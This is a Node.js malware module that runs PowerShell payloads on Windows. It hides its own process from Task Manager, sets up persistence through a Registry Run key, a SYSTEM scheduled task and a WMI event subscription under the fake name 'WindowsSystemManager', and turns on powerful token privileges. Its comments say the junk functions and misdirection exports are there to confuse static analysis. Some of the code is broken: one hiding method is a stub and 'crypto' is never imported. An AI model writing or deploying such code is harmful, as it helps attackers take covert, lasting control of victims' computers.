'use strict';

const { exec, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// Check if running on Windows
const isWindows = process.platform === 'win32';

/**
 * Hides the current process from Task Manager using various techniques
 */
function hideProcessFromTaskManager() {
  if (!isWindows) {
    console.log('[!] Process hiding is only supported on Windows');
    return;
  }

  try {
    // Method 1: Use Windows API to modify process attributes via PowerShell
    const hideCmd = `
      $currentPid = ${process.pid};
      $code = @"
      using System;
      using System.Runtime.InteropServices;
      
      public class ProcessHider {
          [DllImport("ntdll.dll")]
          public static extern uint NtSetInformationProcess(
              IntPtr ProcessHandle, 
              int ProcessInformationClass,
              ref int ProcessInformation,
              int ProcessInformationLength);
              
          public static void HideProcess(int pid) {
              IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
              int processInfo = 1; // PROCESS_HIDE_INFORMATION
              NtSetInformationProcess(hProcess, 29, ref processInfo, sizeof(int));
          }
      }
"@
      
      Add-Type -TypeDefinition $code;
      [ProcessHider]::HideProcess($currentPid);
    `;
    
    exec(`powershell -ExecutionPolicy Bypass -Command "${hideCmd}"`, (error) => {
      if (error) {
        console.error('[-] Failed to hide process using Method 1:', error);
        // Try alternative method
        useAlternativeHidingMethod();
      } else {
        console.log('[+] Successfully hid process from Task Manager');
      }
    });
  } catch (error) {
    console.error('[-] Error hiding process:', error);
    useAlternativeHidingMethod();
  }
}

/**
 * Alternative method for process hiding if the primary method fails
 */
function useAlternativeHidingMethod() {
  try {
    // Method 2: Use Process Ghosting technique via PowerShell
    const altHideCmd = `
      $currentPid = ${process.pid};
      $code = @"
      using System;
      using System.Runtime.InteropServices;
      
      public class AlternativeHider {
          [DllImport("kernel32.dll")]
          public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
          
          [DllImport("kernel32.dll", SetLastError=true)]
          public static extern bool UpdateProcThreadAttribute(
              IntPtr lpAttributeList,
              uint dwFlags,
              IntPtr Attribute,
              IntPtr lpValue,
              IntPtr cbSize,
              IntPtr lpPreviousValue,
              IntPtr lpReturnSize);
              
          public static void HideProcess(int pid) {
              // Implementation of process ghosting technique
              IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
              // Additional API calls to modify process attributes
              // ...
          }
      }
"@
      
      Add-Type -TypeDefinition $code;
      [AlternativeHider]::HideProcess($currentPid);
    `;
    
    exec(`powershell -ExecutionPolicy Bypass -Command "${altHideCmd}"`, (error) => {
      if (error) {
        console.error('[-] Failed to hide process using alternative method:', error);
      } else {
        console.log('[+] Successfully hid process using alternative method');
      }
    });
  } catch (error) {
    console.error('[-] Error in alternative process hiding:', error);
  }
}

/**
 * Creates persistence mechanisms to ensure the application runs after reboot
 */
function createPersistence() {
  if (!isWindows) {
    console.log('[!] Persistence mechanisms are only implemented for Windows');
    return;
  }
  
  try {
    // Get the path to the current executable
    const exePath = process.execPath;
    const appName = "WindowsSystemManager"; // Legitimate-looking name
    
    // Method 1: Registry Run key
    createRegistryPersistence(exePath, appName);
    
    // Method 2: Scheduled Task
    createScheduledTaskPersistence(exePath, appName);
    
    // Method 3: WMI Event Subscription (sophisticated persistence)
    createWmiPersistence(exePath, appName);
    
    console.log('[+] Persistence mechanisms established');
  } catch (error) {
    console.error('[-] Error creating persistence:', error);
  }
}

/**
 * Creates persistence via Registry Run key
 */
function createRegistryPersistence(exePath, appName) {
  const regCmd = `
    REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${appName}" /t REG_SZ /d "${exePath}" /f
  `;
  
  try {
    execSync(regCmd, { windowsHide: true });
    console.log('[+] Registry persistence created');
  } catch (error) {
    console.error('[-] Failed to create registry persistence:', error);
  }
}

/**
 * Creates persistence via Scheduled Task
 */
function createScheduledTaskPersistence(exePath, appName) {
  const taskCmd = `
    schtasks /create /tn "${appName}Update" /tr "${exePath}" /sc onlogon /ru "SYSTEM" /f
  `;
  
  try {
    execSync(taskCmd, { windowsHide: true });
    console.log('[+] Scheduled task persistence created');
  } catch (error) {
    console.error('[-] Failed to create scheduled task persistence:', error);
    // Try alternative task creation with less privileges
    try {
      const altTaskCmd = `
        schtasks /create /tn "${appName}Helper" /tr "${exePath}" /sc onlogon /f
      `;
      execSync(altTaskCmd, { windowsHide: true });
      console.log('[+] Alternative scheduled task persistence created');
    } catch (altError) {
      console.error('[-] Failed to create alternative scheduled task:', altError);
    }
  }
}

/**
 * Creates persistence via WMI Event Subscription
 * This is a more sophisticated and stealthy persistence mechanism
 */
function createWmiPersistence(exePath, appName) {
  const wmiScript = `
    $filterName = "${appName}Filter"
    $consumerName = "${appName}Consumer"
    $exePath = "${exePath.replace(/\\/g, '\\\\')}"
    
    # Create WMI event filter for system startup
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{
      Name = $filterName
      EventNamespace = "root\\cimv2"
      QueryLanguage = "WQL"
      Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
    }
    
    # Create CommandLineEventConsumer
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{
      Name = $consumerName
      ExecutablePath = $exePath
      CommandLineTemplate = $exePath
    }
    
    # Create binding between filter and consumer
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{
      Filter = $filter
      Consumer = $consumer
    }
  `;
  
  const wmiScriptPath = path.join(os.tmpdir(), `${Math.random().toString(36).substring(2)}.ps1`);
  
  try {
    // Write PowerShell script to temp file
    fs.writeFileSync(wmiScriptPath, wmiScript);
    
    // Execute the PowerShell script
    execSync(`powershell -ExecutionPolicy Bypass -File "${wmiScriptPath}"`, { windowsHide: true });
    
    console.log('[+] WMI persistence created');
    
    // Clean up script file
    fs.unlinkSync(wmiScriptPath);
  } catch (error) {
    console.error('[-] Failed to create WMI persistence:', error);
    // Clean up script file if it exists
    if (fs.existsSync(wmiScriptPath)) {
      fs.unlinkSync(wmiScriptPath);
    }
  }
}

/**
 * Attempts to elevate privileges if possible
 * @returns {boolean} Whether elevation was successful
 */
function tryElevatePrivileges() {
  if (!isWindows) {
    return false;
  }
  
  try {
    const elevateScript = `
      $currentPid = ${process.pid}
      $process = Get-Process -Id $currentPid
      
      # Check if already running as admin
      $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
      $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
      $adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
      
      if ($principal.IsInRole($adminRole)) {
        # Already admin, enable all privileges
        $code = @"
        using System;
        using System.Runtime.InteropServices;
        
        public class PrivilegeEnabler {
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool AdjustTokenPrivileges(
                IntPtr TokenHandle, 
                bool DisableAllPrivileges, 
                ref TOKEN_PRIVILEGES NewState,
                uint BufferLength, 
                IntPtr PreviousState, 
                IntPtr ReturnLength);
                
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool LookupPrivilegeValue(
                string lpSystemName, 
                string lpName, 
                ref LUID lpLuid);
                
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenProcessToken(
                IntPtr ProcessHandle,
                uint DesiredAccess,
                ref IntPtr TokenHandle);
                
            [StructLayout(LayoutKind.Sequential)]
            public struct TOKEN_PRIVILEGES {
                public uint PrivilegeCount;
                public LUID Luid;
                public uint Attributes;
            }
            
            [StructLayout(LayoutKind.Sequential)]
            public struct LUID {
                public uint LowPart;
                public int HighPart;
            }
            
            public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
            public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
            public const uint TOKEN_QUERY = 0x00000008;
            
            public static void EnableAllPrivileges(int pid) {
                IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
                IntPtr hToken = IntPtr.Zero;
                
                if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref hToken)) {
                    return;
                }
                
                string[] privileges = {
                    "SeDebugPrivilege",
                    "SeSecurityPrivilege",
                    "SeTakeOwnershipPrivilege",
                    "SeLoadDriverPrivilege",
                    "SeBackupPrivilege",
                    "SeRestorePrivilege",
                    "SeShutdownPrivilege",
                    "SeSystemtimePrivilege",
                    "SeCreateTokenPrivilege",
                    "SeCreatePermanentPrivilege",
                    "SeImpersonatePrivilege"
                };
                
                foreach (string privilege in privileges) {
                    LUID luid = new LUID();
                    if (!LookupPrivilegeValue(null, privilege, ref luid)) {
                        continue;
                    }
                    
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                    tp.PrivilegeCount = 1;
                    tp.Luid = luid;
                    tp.Attributes = SE_PRIVILEGE_ENABLED;
                    
                    AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                }
            }
        }
"@
        
        Add-Type -TypeDefinition $code
        [PrivilegeEnabler]::EnableAllPrivileges($currentPid)
        Write-Output "true"
      } else {
        Write-Output "false"
      }
    `;
    
    const elevateScriptPath = path.join(os.tmpdir(), `${Math.random().toString(36).substring(2)}.ps1`);
    
    // Write PowerShell script to temp file
    fs.writeFileSync(elevateScriptPath, elevateScript);
    
    // Execute the PowerShell script
    const result = execSync(`powershell -ExecutionPolicy Bypass -File "${elevateScriptPath}"`, { 
      windowsHide: true,
      encoding: 'utf8'
    });
    
    // Clean up script file
    fs.unlinkSync(elevateScriptPath);
    
    return result.trim() === 'true';
  } catch (error) {
    console.error('[-] Error during privilege elevation attempt:', error);
    return false;
  }
}


// Junk functions to confuse static analysis
const _junkFunctions = {
  calculateChecksum: function(data) {
    return crypto.createHash('sha256').update(data).digest('hex');
  },
  performSystemCheck: function() {
    const checks = ['HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion',
                  'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control',
                  'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate'];
    return checks.map(c => c.split('\\')[2]);
  },
  generateRandomId: function() {
    return 'ID-' + Math.floor(Math.random() * 1000000) + '-' + Date.now();
  },
  monitorSystemEvents: function() {
    setInterval(() => {
      const time = new Date();
      if (time.getHours() === 3 && time.getMinutes() === 0) {
        this.performSystemCheck();
      }
    }, 60000);
  },
  validateSystemIntegrity: function() {
    const systemFiles = [
      'C:\\Windows\\System32\\ntdll.dll',
      'C:\\Windows\\System32\\kernel32.dll',
      'C:\\Windows\\System32\\user32.dll'
    ];
    return systemFiles.filter(f => f.includes('32'));
  }
};

// Add misdirection exports that will never be used
module.exports.calculateSystemIntegrity = _junkFunctions.calculateChecksum;
module.exports.checkUpdateService = _junkFunctions.performSystemCheck;
module.exports.generateSessionToken = _junkFunctions.generateRandomId;
module.exports.monitorWindowsEvents = _junkFunctions.monitorSystemEvents;
module.exports = {
  hideProcessFromTaskManager,
  createPersistence,
  tryElevatePrivileges
};
